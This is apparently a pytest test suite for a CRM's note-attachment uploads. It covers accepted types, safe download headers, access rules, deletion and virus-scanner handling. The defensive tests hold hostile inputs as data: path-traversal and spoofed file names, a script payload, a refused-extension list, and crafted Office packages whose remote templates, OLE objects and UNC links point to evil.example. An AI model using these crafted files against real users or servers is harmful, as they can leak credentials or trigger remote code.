"""Note attachments (docs/activities.md#attachments): what is accepted, where it goes, who
may reach it, and what happens when storage or the scanner fails."""

from __future__ import annotations

import codecs
import hashlib
import io
import socket
import struct
import threading
import zipfile
from datetime import timedelta
from urllib.parse import quote

import pytest
from django.core.files.storage import storages
from django.utils import timezone

from arkray.activities import attachments, storage
from arkray.activities.models import Attachment
from arkray.audit.models import AuditEvent
from arkray.core.access import AccessScope
from arkray.leads import services as lead_services
from tests.factories import LeadFactory, NoteFactory, OpportunityFactory
from tests.helpers import drain_outbox, signed_in

pytestmark = pytest.mark.django_db

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00\x00\x00\rIHDR" + b"\x01" * 64
JPEG = b"\xff\xd8\xff\xe0" + b"\x10" * 64
WEBP = b"RIFF\x24\x00\x00\x00WEBPVP8 " + b"\x00" * 40
PDF = b"%PDF-1.7\n1 0 obj\n<< >>\nendobj\ntrailer\n%%EOF\n"


def ooxml(*parts: str) -> bytes:
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w") as package:
        for part in parts:
            package.writestr(part, "<x/>")
    return out.getvalue()


DOCX = ooxml("[Content_Types].xml", "word/document.xml")
XLSX = ooxml("[Content_Types].xml", "xl/workbook.xml")


def upload(client, note, name, content, workspace="me"):
    return client.post(
        f"/api/v1/workspaces/{workspace}/activities/{note.pk}/attachments",
        content,
        content_type="application/octet-stream",
        HTTP_X_FILENAME=quote(name, safe=""),
    )


def download(client, attachment_id, workspace="me", kind="download"):
    return client.get(f"/api/v1/workspaces/{workspace}/attachments/{attachment_id}/{kind}")


def body(response) -> bytes:
    return b"".join(response.streaming_content)


@pytest.fixture
def note(user_a):
    lead = LeadFactory(owner=user_a)
    return NoteFactory(lead=lead, opportunity=OpportunityFactory(lead=lead), created_by=user_a)


class TestUpload:
    @pytest.mark.parametrize(
        ("name", "content", "content_type"),
        [
            ("photo.png", PNG, "image/png"),
            ("scan.JPG", JPEG, "image/jpeg"),
            ("pic.webp", WEBP, "image/webp"),
            ("quote.pdf", PDF, "application/pdf"),
            (
                "proposal.docx",
                DOCX,
                "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            ),
            (
                "prices.xlsx",
                XLSX,
                "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            ),
            ("list.csv", b"name,tests\nCity Lab,300\n", "text/csv"),
            ("notes.txt", "Namaste नमस्ते".encode(), "text/plain"),
        ],
    )
    def test_allowed_types_are_stored_privately_under_a_generated_key(
        self, user_a, user_a_client, note, name, content, content_type
    ):
        response = upload(user_a_client, note, name, content)
        assert response.status_code == 201, response.content
        data = response.json()
        assert (data["name"], data["content_type"], data["size"]) == (
            name,
            content_type,
            len(content),
        )
        assert "storage_key" not in data
        row = Attachment.objects.get(pk=data["id"])
        assert name not in row.storage_key
        assert "/" in row.storage_key
        assert row.sha256 == hashlib.sha256(content).hexdigest()
        assert row.state == "stored"
        assert row.scan_status == "not_scanned"
        with storages["attachments"].open(row.storage_key, "rb") as stored:
            assert stored.read() == content
        event = AuditEvent.objects.get(action="attachment.uploaded")
        assert name not in str(event.metadata)  # the name is personal text: never audited

    def test_the_download_is_the_file_with_safe_headers(self, user_a_client, note):
        attachment_id = upload(user_a_client, note, "quote.pdf", PDF).json()["id"]
        response = download(user_a_client, attachment_id)
        assert response.status_code == 200
        assert body(response) == PDF
        assert response["Content-Type"] == "application/pdf"
        assert response["Content-Disposition"].startswith('attachment; filename="quote.pdf"')
        assert response["X-Content-Type-Options"] == "nosniff"
        assert "sandbox" in response["Content-Security-Policy"]
        assert "default-src 'none'" in response["Content-Security-Policy"]
        assert {"private", "no-store"} <= {
            part.strip() for part in response["Cache-Control"].split(",")
        }

    def test_only_images_preview_inline(self, user_a_client, note):
        image = upload(user_a_client, note, "photo.png", PNG).json()
        pdf = upload(user_a_client, note, "quote.pdf", PDF).json()
        assert (image["previewable"], pdf["previewable"]) == (True, False)
        preview = download(user_a_client, image["id"], kind="preview")
        assert preview.status_code == 200
        assert body(preview) == PNG
        assert preview["Content-Disposition"].startswith("inline;")
        assert preview["Content-Type"] == "image/png"
        assert download(user_a_client, pdf["id"], kind="preview").status_code == 422

    def test_a_non_ascii_name_is_kept_and_safely_encoded(self, user_a_client, note):
        name = 'प्रस्ताव "final"; v2.pdf'
        attachment_id = upload(user_a_client, note, name, PDF).json()["id"]
        disposition = download(user_a_client, attachment_id)["Content-Disposition"]
        assert "filename*=UTF-8''" + quote(name, safe="") in disposition
        assert '"final"' not in disposition.split(";")[1]  # the ASCII fallback is sanitised


class TestRefused:
    @pytest.mark.parametrize(
        "name",
        [
            "setup.exe",
            "lib.dll",
            "run.bat",
            "run.cmd",
            "script.ps1",
            "install.sh",
            "app.js",
            "page.html",
            "page.htm",
            "logo.svg",
            "archive.zip",
            "shell.php",
            "invoice.pdf.exe",
            "macro.docm",
            "noextension",
        ],
    )
    def test_dangerous_or_unknown_types(self, user_a_client, note, name):
        response = upload(user_a_client, note, name, PDF)
        assert response.status_code == 400
        assert "isn't allowed" in response.json()["error"]["details"]["file"][0]
        assert not Attachment.objects.exists()

    @pytest.mark.parametrize(
        ("name", "content"),
        [
            ("photo.png", PDF),  # a PDF called .png
            ("quote.pdf", b"<html><script>alert(1)</script></html>"),
            ("photo.jpg", PNG),
            ("proposal.docx", ooxml("[Content_Types].xml")),  # a zip, not a document
            (
                "proposal.docx",
                ooxml("[Content_Types].xml", "word/document.xml", "word/vbaProject.bin"),
            ),
            ("prices.xlsx", DOCX),
            ("notes.txt", b"MZ\x90\x00\x03\x00\x00\x00"),  # an executable called .txt
            ("notes.txt", b"\xff\xfe\xfa invalid utf-8"),
            ("list.csv", b"a,b\x00c"),
        ],
    )
    def test_content_must_be_what_the_name_says(self, user_a_client, note, name, content):
        response = upload(user_a_client, note, name, content)
        assert response.status_code == 400, response.content
        assert not Attachment.objects.exists()

    @pytest.mark.parametrize(
        ("raw", "stored"),
        [
            ("../../etc/passwd.txt", "passwd.txt"),
            ("..\\..\\windows\\win.ini.txt", "win.ini.txt"),
            ("/var/www/../notes.txt", "notes.txt"),
            ("  ..hidden.txt", "hidden.txt"),
            ("line\nbreak.txt", "line break.txt"),  # whitespace collapses, as in every name
        ],
    )
    def test_paths_are_never_trusted(self, user_a_client, note, raw, stored):
        response = upload(user_a_client, note, raw, b"hello")
        assert response.status_code == 201, response.content
        row = Attachment.objects.get(pk=response.json()["id"])
        assert row.original_name == stored
        assert ".." not in row.storage_key
        assert "passwd" not in row.storage_key

    @pytest.mark.parametrize(
        "name",
        [
            "a\x00b.txt",
            "a" + chr(0x202E) + "txt.exe",
            "x" * 201 + ".txt",
            "",
            ".txt",
        ],
    )
    def test_hostile_names(self, user_a_client, note, name):
        assert upload(user_a_client, note, name, b"hello").status_code == 400

    def test_empty_files(self, user_a_client, note):
        response = upload(user_a_client, note, "empty.txt", b"")
        assert response.status_code == 400
        assert "empty" in response.json()["error"]["details"]["file"][0]

    def test_oversized_files_are_refused_as_they_arrive(self, user_a_client, note, settings):
        settings.ATTACHMENT_MAX_BYTES = 1024
        response = upload(user_a_client, note, "big.txt", b"a" * 1025)
        assert response.status_code == 413
        assert response.json()["error"]["code"] == "file_too_large"
        assert upload(user_a_client, note, "fits.txt", b"a" * 1024).status_code == 201

    def test_the_declared_length_is_checked_before_reading(self, user_a_client, note, settings):
        settings.ATTACHMENT_MAX_BYTES = 1024
        response = user_a_client.post(
            f"/api/v1/workspaces/me/activities/{note.pk}/attachments",
            b"a" * 10,
            content_type="application/octet-stream",
            HTTP_X_FILENAME="small.txt",
            CONTENT_LENGTH="999999999",
        )
        assert response.status_code == 413

    def test_a_note_holds_a_bounded_number_of_files(self, user_a_client, note, settings):
        settings.ATTACHMENT_MAX_PER_NOTE = 2
        for n in range(2):
            assert upload(user_a_client, note, f"{n}.txt", b"x").status_code == 201
        assert upload(user_a_client, note, "3.txt", b"x").status_code == 422

    def test_only_notes_take_files(self, user_a, user_a_client):
        from tests.factories import TaskFactory

        task = TaskFactory(lead=LeadFactory(owner=user_a))
        assert upload(user_a_client, task, "x.txt", b"x").status_code == 404

    def test_an_archived_note_takes_none(self, user_a_client, note):
        note.archived_at = timezone.now()
        note.save(update_fields=["archived_at"])
        assert upload(user_a_client, note, "x.txt", b"x").status_code == 422


def package(parts: dict[str, str | bytes]) -> bytes:
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as built:
        for name, text in parts.items():
            built.writestr(name, text)
    return out.getvalue()


TYPES = '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'
EXTERNAL_TEMPLATE = (
    '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
    'officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm"'
    ' TargetMode="External"/></Relationships>'
)
R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
DECLARATION = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
UTF16_DECLARATION = '<?xml version="1.0" encoding="UTF-16"?>'


def rels(*relationships: str, declaration: str = DECLARATION) -> str:
    return (
        f"{declaration}<Relationships"
        ' xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        f"{''.join(relationships)}</Relationships>"
    )


# The deep security audit's M-3 variants (each got past the byte search with a 201), and more
# ways to say the same thing to Office.
TEMPLATE = f'Id="rId1" Type="{R}attachedTemplate" Target="https://evil.example/t.dotm"'
SETTINGS_RELS = "word/_rels/settings.xml.rels"
DOCUMENT_RELS = "word/_rels/document.xml.rels"
WORKBOOK_RELS = "xl/_rels/workbook.xml.rels"
AUDIT_M3_VARIANTS = [
    (
        "single-quotes.docx",
        {
            SETTINGS_RELS: rels(
                f"<Relationship Id='rId1' Type='{R}attachedTemplate'"
                " Target='https://evil.example/t.dotm' TargetMode='External'/>"
            )
        },
    ),
    (
        "spaces.docx",
        {SETTINGS_RELS: rels(f'<Relationship {TEMPLATE} TargetMode = "External"/>')},
    ),
    (
        "character-reference.docx",
        {
            SETTINGS_RELS: rels(
                f'<Relationship Id="rId1" Type="{R}attached&#84;emplate"'
                ' Target="https://evil.example/t.dotm" TargetMode="External"/>'
            )
        },
    ),
    (
        "utf16-rels.docx",
        {
            SETTINGS_RELS: rels(
                f'<Relationship {TEMPLATE} TargetMode="External"/>',
                declaration=UTF16_DECLARATION,
            ).encode("utf-16")
        },
    ),
    (
        "follina.docx",
        {
            DOCUMENT_RELS: rels(
                f'<Relationship Id="rId9" Type="{R}oleObject"'
                ' Target="http://evil.example/x.html!" TargetMode="External"/>'
            )
        },
    ),
    (
        "external-image.docx",
        {
            DOCUMENT_RELS: rels(
                f'<Relationship Id="rId5" Type="{R}image"'
                ' Target="\\\\evil.example\\share\\p.png" TargetMode="External"/>'
            )
        },
    ),
    (
        "external-link.xlsx",
        {
            "xl/externalLinks/externalLink1.xml": "<externalLink/>",
            "xl/externalLinks/_rels/externalLink1.xml.rels": rels(
                f'<Relationship Id="rId1" Type="{R}externalLinkPath"'
                ' Target="file:///\\\\evil.example\\s\\book.xlsx" TargetMode="External"/>'
            ),
        },
    ),
    (
        "external-link-path-elsewhere.xlsx",
        {
            WORKBOOK_RELS: rels(
                f'<Relationship Id="rId1" Type="{R}externalLinkPath"'
                ' Target="https://evil.example/book.xlsx" TargetMode="External"/>'
            )
        },
    ),
    (
        "utf16-types-vba.docx",
        {
            "[Content_Types].xml": (
                f"{UTF16_DECLARATION}<Types xmlns="
                '"http://schemas.openxmlformats.org/package/2006/content-types">'
                '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
                "</Types>"
            ).encode("utf-16")
        },
    ),
    ("malformed-rels.docx", {DOCUMENT_RELS: '<Relationships><Relationship Id="r1"'}),
    ("malformed-types.docx", {"[Content_Types].xml": "<Types>"}),
    (
        "entity.docx",
        {
            DOCUMENT_RELS: '<!DOCTYPE r [<!ENTITY m "External">]><Relationships>'
            f'<Relationship Id="r" Type="{R}image" Target="https://evil.example/p.png"'
            ' TargetMode="&m;"/></Relationships>'
        },
    ),
    ("dtd.docx", {DOCUMENT_RELS: "<!DOCTYPE Relationships><Relationships/>"}),
]
MORE_M3_VARIANTS = [
    (
        "padded-mode.docx",
        {
            DOCUMENT_RELS: rels(
                f'<Relationship Id="r" Type="{R}image" Target="https://evil.example/p.png"'
                ' TargetMode=" external "/>'
            )
        },
    ),
    (
        "unknown-mode.docx",
        {
            DOCUMENT_RELS: rels(
                f'<Relationship Id="r" Type="{R}image" Target="p.png" TargetMode="Remote"/>'
            )
        },
    ),
    (
        "unc-target.docx",
        {
            DOCUMENT_RELS: rels(
                f'<Relationship Id="r" Type="{R}image" Target="\\\\evil.example\\s\\p.png"/>'
            )
        },
    ),
    (
        "url-target.docx",
        {DOCUMENT_RELS: rels(f'<Relationship Id="r" Type="{R}image" Target="https://e.x/p"/>')},
    ),
    (
        "lowercase-attributes.docx",
        {
            DOCUMENT_RELS: rels(
                f'<Relationship id="r" type="{R}image" target="https://e.x/p"'
                ' targetmode="External"/>'
            )
        },
    ),
    (
        "strict-template.docx",
        {
            SETTINGS_RELS: rels(
                '<Relationship Id="r" Type="http://purl.oclc.org/ooxml/officeDocument/'
                'relationships/attachedTemplate" Target="t.dotm"/>'
            )
        },
    ),
    (
        "uppercase-rels-name.docx",
        {"WORD/_RELS/SETTINGS.XML.RELS": EXTERNAL_TEMPLATE},
    ),
    (
        "activex-control.docx",
        {DOCUMENT_RELS: rels(f'<Relationship Id="r" Type="{R}control" Target="ctl.xml"/>')},
    ),
    (
        "subdocument.docx",
        {
            DOCUMENT_RELS: rels(
                f'<Relationship Id="r" Type="{R}subDocument" Target="part.docx"'
                ' TargetMode="External"/>'
            )
        },
    ),
    (
        "frame.docx",
        {
            "word/_rels/webSettings.xml.rels": rels(
                f'<Relationship Id="r" Type="{R}frame" Target="f.docx"/>'
            )
        },
    ),
    (
        "data-connection.xlsx",
        {
            "xl/connections.xml": "<connections/>",
            WORKBOOK_RELS: rels(
                f'<Relationship Id="r" Type="{R}connections" Target="connections.xml"/>'
            ),
        },
    ),
    (
        "declared-external-link.xlsx",
        {
            "[Content_Types].xml": '<Types><Override PartName="/xl/links/l1.xml" ContentType='
            '"application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml"/>'
            "</Types>"
        },
    ),
    (
        "utf8-declared-utf16.docx",
        {DOCUMENT_RELS: rels(declaration=UTF16_DECLARATION)},
    ),
    (
        "latin1-declared.docx",
        {
            DOCUMENT_RELS: rels(declaration='<?xml version="1.0" encoding="ISO-8859-1"?>').encode(
                "latin-1"
            )
        },
    ),
    (
        "utf16-without-bom.docx",
        {DOCUMENT_RELS: rels(declaration=UTF16_DECLARATION).encode("utf-16-le")},
    ),
    (
        "oversized-rels.docx",
        {
            DOCUMENT_RELS: rels(
                *(
                    f'<Relationship Id="r{n}" Type="{R}styles" Target="styles.xml"/>'
                    for n in range(storage.OOXML_XML_PART_BYTES // 80)
                )
            )
        },
    ),
]
# Independent review of the M-3 fix: documents Word imports when it opens the file (altChunk),
# Office add-ins, and a "hyperlink" that isn't one. Each case trips one rule only.
WEBEXTENSION = "http://schemas.microsoft.com/office/2011/relationships/webextension"
REVIEW_VARIANTS = [
    (
        "altchunk-relationship.docx",  # the relationship alone (a neutral part name and type)
        {DOCUMENT_RELS: rels(f'<Relationship Id="r" Type="{R}aFChunk" Target="chunk.dat"/>')},
    ),
    (
        "altchunk-rtf-part.docx",  # the part's name alone
        {"word/afchunk.rtf": "{\\rtf1{\\object\\objautlink\\objupdate}}"},
    ),
    ("altchunk-mht-part.docx", {"word/chunk.MHT": "MIME-Version: 1.0"}),
    ("altchunk-html-part.docx", {"word/chunk.html": "<img src='https://evil.example/p.png'>"}),
    *(
        (
            f"declared-{label}.docx",  # the declared type alone
            {
                "[Content_Types].xml": f'<Types><Default Extension="dat" ContentType="{kind}"/>'
                "</Types>"
            },
        )
        for label, kind in (
            ("rtf", "application/rtf"),
            ("text-rtf", "text/rtf"),
            ("mht", "message/rfc822"),
            ("html", "text/html"),
            ("xhtml", "application/xhtml+xml"),
            ("webextension", "application/vnd.ms-office.webextension+xml"),
            ("taskpanes", "application/vnd.ms-office.webextensiontaskpanes+xml"),
        )
    ),
    (
        "webextension-relationship.docx",
        {
            "word/_rels/taskpanes.xml.rels": rels(
                f'<Relationship Id="r" Type="{WEBEXTENSION}" Target="addin.xml"/>'
            )
        },
    ),
    (
        "taskpanes-relationship.docx",
        {
            "_rels/.rels": rels(
                f'<Relationship Id="r" Type="{WEBEXTENSION}taskpanes" Target="word/t.xml"/>'
            )
        },
    ),
    ("webextension-part.docx", {"word/webextensions/webextension1.xml": "<x/>"}),
    (
        "not-really-a-hyperlink.docx",
        {
            DOCUMENT_RELS: rels(
                '<Relationship Id="r" Type="http://attacker.example/hyperlink"'
                ' Target="http://attacker.example/x.png" TargetMode="External"/>'
            )
        },
    ),
]


class TestOfficeActiveContent:
    """Enhancement security review: macros, OLE objects and ActiveX are refused however the
    parts are named; ordinary Office files (printer settings, embedded charts) still pass."""

    @pytest.mark.parametrize(
        ("name", "parts"),
        [
            ("ole.docx", {"word/embeddings/oleObject1.bin": "x"}),
            ("activex.docx", {"word/activeX/activeX1.xml": "<x/>"}),
            ("renamed-vba.docx", {"word/macros01.bin": "x"}),
            ("packaged-exe.docx", {"word/embeddings/setup.exe": "MZ"}),
            (
                "declared-vba.docx",
                {
                    "[Content_Types].xml": '<Types><Override PartName="/word/x.xml" ContentType='
                    '"application/vnd.ms-office.vbaProject"/></Types>'
                },
            ),
            ("remote-template.docx", {"word/_rels/settings.xml.rels": EXTERNAL_TEMPLATE}),
            ("macros.xlsx", {"xl/workbook.xml": "<x/>", "xl/vbaProject.bin": "x"}),
            *AUDIT_M3_VARIANTS,
            *MORE_M3_VARIANTS,
            *REVIEW_VARIANTS,
        ],
    )
    def test_refused(self, user_a_client, note, name, parts):
        main = "xl/workbook.xml" if name.endswith(".xlsx") else "word/document.xml"
        content = package({"[Content_Types].xml": TYPES, main: "<x/>", **parts})
        response = upload(user_a_client, note, name, content)
        assert response.status_code == 400, response.content
        assert "doesn't match its type" in response.json()["error"]["details"]["file"][0]
        assert not Attachment.objects.exists()

    def test_a_corrupt_part_is_refused_not_an_error(self, user_a_client, note):
        """A relationships part whose deflate stream is broken (zlib.error, which zipfile
        doesn't wrap): refused like any unreadable package, never a 500."""
        content = bytearray(
            package(
                {"[Content_Types].xml": TYPES, "word/document.xml": "<x/>", DOCUMENT_RELS: rels()}
            )
        )
        with zipfile.ZipFile(io.BytesIO(bytes(content))) as built:
            start = built.getinfo(DOCUMENT_RELS).header_offset
        name_length, extra_length = struct.unpack("<HH", content[start + 26 : start + 30])
        content[start + 30 + name_length + extra_length] = 0xFF  # a reserved block type
        response = upload(user_a_client, note, "corrupt.docx", bytes(content))
        assert response.status_code == 400, response.content
        assert not Attachment.objects.exists()

    @pytest.mark.parametrize(
        ("name", "parts"),
        [
            (
                "print.xlsx",
                {"xl/workbook.xml": "<x/>", "xl/printerSettings/printerSettings1.bin": "x"},
            ),
            ("chart.docx", {"word/document.xml": "<x/>", "word/embeddings/Sheet1.xlsx": "x"}),
            (
                "links.docx",
                {
                    "word/document.xml": "<x/>",
                    # The real hyperlink Type URI (review P3-4: "http://x/hyperlink", which
                    # this case used, is no longer a hyperlink).
                    "word/_rels/document.xml.rels": '<Relationships><Relationship Id="r"'
                    f' Type="{R}hyperlink" Target="https://arkray.example"'
                    ' TargetMode="External"/></Relationships>',
                },
            ),
        ],
    )
    def test_ordinary_documents_pass(self, user_a_client, note, name, parts):
        response = upload(
            user_a_client, note, name, package({"[Content_Types].xml": TYPES, **parts})
        )
        assert response.status_code == 201, response.content

    @pytest.mark.parametrize("name", ["proposal.docx", "prices.xlsx", "deck.pptx"])
    def test_real_world_packages_with_hyperlinks_pass(self, user_a_client, note, settings, name):
        """Packages shaped like what Word, Excel and PowerPoint write: namespaces, a UTF-8
        byte-order mark, single-quoted declarations, UTF-16 parts, internal pictures, printer
        settings and hyperlinks to web pages and e-mail addresses (deep security audit M-3:
        the stricter check must not refuse ordinary files)."""
        settings.ATTACHMENT_ALLOWED_EXTENSIONS = ["docx", "xlsx", "pptx"]
        response = upload(user_a_client, note, name, OFFICE_FILES[name])
        assert response.status_code == 201, response.content


def office_types(*overrides: tuple[str, str]) -> bytes:
    defaults = (
        ("rels", "application/vnd.openxmlformats-package.relationships+xml"),
        ("xml", "application/xml"),
        ("png", "image/png"),
        ("bin", "application/vnd.openxmlformats-officedocument.spreadsheetml.printerSettings"),
    )
    return (
        codecs.BOM_UTF8
        + (
            f"{DECLARATION}<Types"
            ' xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            + "".join(f'<Default Extension="{e}" ContentType="{t}"/>' for e, t in defaults)
            + "".join(f'<Override PartName="{p}" ContentType="{t}"/>' for p, t in overrides)
            + "</Types>"
        ).encode()
    )


PACKAGE_RELS = "http://schemas.openxmlformats.org/package/2006/relationships/metadata/"
ML = "application/vnd.openxmlformats-officedocument."


def office_root(main: str) -> str:
    return rels(
        f'<Relationship Id="rId1" Type="{R}officeDocument" Target="{main}"/>',
        f'<Relationship Id="rId2" Type="{PACKAGE_RELS}core-properties"'
        ' Target="docProps/core.xml"/>',
        f'<Relationship Id="rId3" Type="{R}extended-properties" Target="docProps/app.xml"/>',
    )


HYPERLINKS = (
    f'<Relationship Id="rId8" Type="{R}hyperlink" Target="https://www.arkray.example/products"'
    ' TargetMode="External"/>',
    f'<Relationship Id="rId9" Type="{R}hyperlink" Target="mailto:sales@lab.example"'
    ' TargetMode="External"/>',
    # Strict OOXML's hyperlink URI (and a Transitional one in other letter case).
    '<Relationship Id="rId10" Type="http://purl.oclc.org/ooxml/officeDocument/relationships/'
    'hyperlink" Target="https://www.arkray.example/" TargetMode="External"/>',
    f'<Relationship Id="rId11" Type="{R.upper()}HYPERLINK" Target="https://lab.example/"'
    ' TargetMode="External"/>',
)
OFFICE_FILES = {
    "proposal.docx": package(
        {
            "[Content_Types].xml": office_types(
                ("/word/document.xml", ML + "wordprocessingml.document.main+xml")
            ),
            "_rels/.rels": office_root("word/document.xml"),
            "word/document.xml": "<w:document xmlns:w='urn:w'/>",
            DOCUMENT_RELS: rels(
                f'<Relationship Id="rId1" Type="{R}styles" Target="styles.xml"/>',
                f'<Relationship Id="rId2" Type="{R}settings" Target="settings.xml"/>',
                f'<Relationship Id="rId3" Type="{R}image" Target="media/image1.png"/>',
                f'<Relationship Id="rId4" Type="{R}package"'
                ' Target="embeddings/Microsoft_Excel_Worksheet.xlsx"/>',
                *HYPERLINKS,
            ),
            "word/media/image1.png": PNG,
            "word/embeddings/Microsoft_Excel_Worksheet.xlsx": "x",
        }
    ),
    "prices.xlsx": package(
        {
            "[Content_Types].xml": office_types(
                ("/xl/workbook.xml", ML + "spreadsheetml.sheet.main+xml")
            ),
            "_rels/.rels": office_root("xl/workbook.xml"),
            "xl/workbook.xml": "<workbook/>",
            WORKBOOK_RELS: rels(
                f"<Relationship Id='rId1' Type='{R}worksheet' Target='worksheets/sheet1.xml'/>",
                f"<Relationship Id='rId2' Type='{R}sharedStrings' Target='sharedStrings.xml'/>",
                declaration="<?xml version='1.0' encoding='utf-8'?>",
            ),
            "xl/worksheets/_rels/sheet1.xml.rels": rels(
                f'<Relationship Id="rId1" Type="{R}printerSettings"'
                ' Target="../printerSettings/printerSettings1.bin"/>',
                *HYPERLINKS,
            ),
            "xl/printerSettings/printerSettings1.bin": b"\x00\x01",
        }
    ),
    "deck.pptx": package(
        {
            "[Content_Types].xml": office_types(
                ("/ppt/presentation.xml", ML + "presentationml.presentation.main+xml")
            ),
            "_rels/.rels": office_root("ppt/presentation.xml"),
            "ppt/presentation.xml": "<p:presentation xmlns:p='urn:p'/>",
            "ppt/_rels/presentation.xml.rels": rels(
                f'<Relationship Id="rId1" Type="{R}slide" Target="slides/slide1.xml"/>',
            ),
            # Written as UTF-16 (with its byte-order mark), as OPC allows.
            "ppt/slides/_rels/slide1.xml.rels": codecs.BOM_UTF16_LE
            + rels(
                f'<Relationship Id="rId1" Type="{R}slideLayout"'
                ' Target="../slideLayouts/slideLayout1.xml"/>',
                *HYPERLINKS,
                declaration=UTF16_DECLARATION,
            ).encode("utf-16-le"),
        }
    ),
}


class TestAuthorization:
    def test_another_user_can_neither_add_read_nor_delete(self, user_a_client, user_b, note):
        attachment_id = upload(user_a_client, note, "secret.pdf", PDF).json()["id"]
        priya = signed_in(user_b)
        assert upload(priya, note, "mine.txt", b"x").status_code == 404
        for kind in ("download", "preview"):
            assert download(priya, attachment_id, kind=kind).status_code == 404
        assert priya.delete(f"/api/v1/workspaces/me/attachments/{attachment_id}").status_code == 404
        assert Attachment.objects.get(pk=attachment_id).deleted_at is None

    def test_knowing_the_id_is_not_enough_in_another_workspace(
        self, admin_client, user_a_client, user_b, note
    ):
        attachment_id = upload(user_a_client, note, "secret.pdf", PDF).json()["id"]
        # the administrator, but through Priya's workspace: not found
        response = download(admin_client, attachment_id, workspace=str(user_b.pk))
        assert response.status_code == 404
        allowed = download(admin_client, attachment_id, workspace=str(note.owner_id))
        assert allowed.status_code == 200

    def test_an_administrator_works_with_files_in_a_users_workspace(
        self, admin, admin_client, user_a, note
    ):
        ws = str(user_a.pk)
        response = upload(admin_client, note, "from-admin.txt", b"hi", workspace=ws)
        assert response.status_code == 201, response.content
        event = AuditEvent.objects.get(action="attachment.uploaded")
        assert (event.actor_id, event.subject_user_id) == (admin.pk, user_a.pk)

    def test_only_the_author_or_an_administrator_changes_a_notes_files(
        self, admin, user_a, user_a_client
    ):
        lead = LeadFactory(owner=user_a)
        admins_note = NoteFactory(lead=lead, created_by=admin)
        assert upload(user_a_client, admins_note, "x.txt", b"x").status_code == 403

    def test_the_download_rechecks_on_every_request(
        self, admin, user_a, user_a_client, user_b, note
    ):
        attachment_id = upload(user_a_client, note, "x.txt", b"x").json()["id"]
        assert download(user_a_client, attachment_id).status_code == 200
        lead = note.lead
        lead.refresh_from_db()
        lead_services.reassign_lead(
            actor=admin,
            scope=AccessScope.organization(admin.pk),
            lead_id=lead.pk,
            version=lead.version,
            owner_id=user_b.pk,
        )
        # The note followed its lead to Priya: Rahul's old link now finds nothing.
        assert download(user_a_client, attachment_id).status_code == 404
        assert download(signed_in(user_b), attachment_id).status_code == 200


class TestDeleting:
    def test_hidden_at_once_and_the_object_removed_by_a_job(self, user_a_client, note):
        attachment_id = upload(user_a_client, note, "x.txt", b"x").json()["id"]
        key = Attachment.objects.get(pk=attachment_id).storage_key
        url = f"/api/v1/workspaces/me/attachments/{attachment_id}"
        assert user_a_client.delete(url).status_code == 204
        assert user_a_client.delete(url).status_code == 204  # a retry
        assert download(user_a_client, attachment_id).status_code == 404
        assert storages["attachments"].exists(key)
        drain_outbox()
        assert not storages["attachments"].exists(key)
        row = Attachment.objects.get(pk=attachment_id)
        assert row.purged_at is not None
        assert AuditEvent.objects.filter(action="attachment.deleted").count() == 1

    def test_housekeeping_resolves_abandoned_uploads_idempotently(self, user_a, note):
        row = Attachment.objects.create(
            note=note,
            original_name="half.txt",
            extension="txt",
            content_type="text/plain",
            size=1,
            sha256="0" * 64,
            storage_key="2026/10/abandoned",
            uploaded_by=user_a,
            created_at=timezone.now() - timedelta(hours=2),
        )
        storages["attachments"].save(row.storage_key, io.BytesIO(b"x"))
        first = attachments.housekeeping(timezone.now())
        assert (first["abandoned"], first["purged"]) == (1, 1)
        assert not storages["attachments"].exists(row.storage_key)
        second = attachments.housekeeping(timezone.now())
        assert (second["abandoned"], second["purged"]) == (0, 0)


class TestReviewRegressions:
    """Enhancement review findings, each pinned."""

    def test_an_archived_or_erased_leads_notes_take_no_new_files_or_text(
        self, user_a, user_a_client, note
    ):
        """P2: files and edited text could be added to an erased lead's notes, beyond the
        reach of any later erasure."""
        lead_services.archive_lead(
            actor=user_a, scope=AccessScope.own(user_a.pk), lead_id=note.lead_id, version=1
        )
        response = upload(user_a_client, note, "x.txt", b"x")
        assert response.status_code == 422
        assert "archived" in response.json()["error"]["message"]
        note.refresh_from_db()
        edit = user_a_client.patch(
            f"/api/v1/workspaces/me/activities/{note.pk}",
            {"version": note.version, "description": "new words"},
            format="json",
        )
        assert edit.status_code == 422
        assert not Attachment.objects.exists()

    def test_configuring_a_scanner_later_scans_the_earlier_files(
        self, user_a_client, note, settings, clamd
    ):
        """P2: files stored without a scanner became undownloadable for good once one was
        configured (nothing ever scanned them)."""
        scanner = settings.ATTACHMENT_SCANNER
        settings.ATTACHMENT_SCANNER = ""
        created = upload(user_a_client, note, "x.txt", b"fine").json()
        assert created["scan_status"] == "not_scanned"
        settings.ATTACHMENT_SCANNER = scanner
        assert attachments.housekeeping(timezone.now())["queued_for_scanning"] == 1
        drain_outbox()
        assert Attachment.objects.get(pk=created["id"]).scan_status == "clean"
        assert download(user_a_client, created["id"]).status_code == 200
        assert attachments.housekeeping(timezone.now())["queued_for_scanning"] == 0

    def test_removing_the_scanner_releases_files_waiting_for_a_scan(
        self, user_a_client, note, settings
    ):
        settings.ATTACHMENT_SCANNER = "clamd://127.0.0.1:1"  # nothing listens
        created = upload(user_a_client, note, "x.txt", b"fine").json()
        assert created["scan_status"] == "pending"
        settings.ATTACHMENT_SCANNER = ""
        assert attachments.housekeeping(timezone.now())["no_longer_scanned"] == 1
        assert download(user_a_client, created["id"]).status_code == 200


def test_a_size_limit_beyond_what_the_database_stores_is_a_startup_error(settings):
    settings.ATTACHMENT_MAX_BYTES = 200 * 1024 * 1024
    assert [e.id for e in storage.check_allowed_extensions()] == ["arkray.E022"]


def test_a_negative_storage_quota_is_a_startup_error(settings):
    settings.ATTACHMENT_MAX_BYTES_PER_USER = -1
